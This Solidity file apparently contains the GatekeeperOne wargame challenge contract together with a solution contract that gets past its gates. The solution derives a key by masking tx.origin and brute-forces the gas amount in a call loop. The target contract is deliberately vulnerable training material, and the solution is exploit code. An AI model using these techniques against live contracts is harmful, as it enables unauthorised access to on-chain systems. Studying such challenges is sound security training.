// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Building {
	GatekeeperOne private g;

	constructor(address gatekeeper) public {
		g = GatekeeperOne(gatekeeper);
	}

	function temp() public returns(bool) {
		bytes8 key = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;

    for (uint i=0 ; i<80 ; i++) {
		  (bool success, ) = address(g).call.gas((i + 170) + (8191*6))(abi.encodeWithSignature("enter(bytes8)", key));
      if (success) {
        return success;
      }
    }
	}

  function entrants() public view returns (address) {
    address entrant = g.entrant();

    return entrant;
  }
}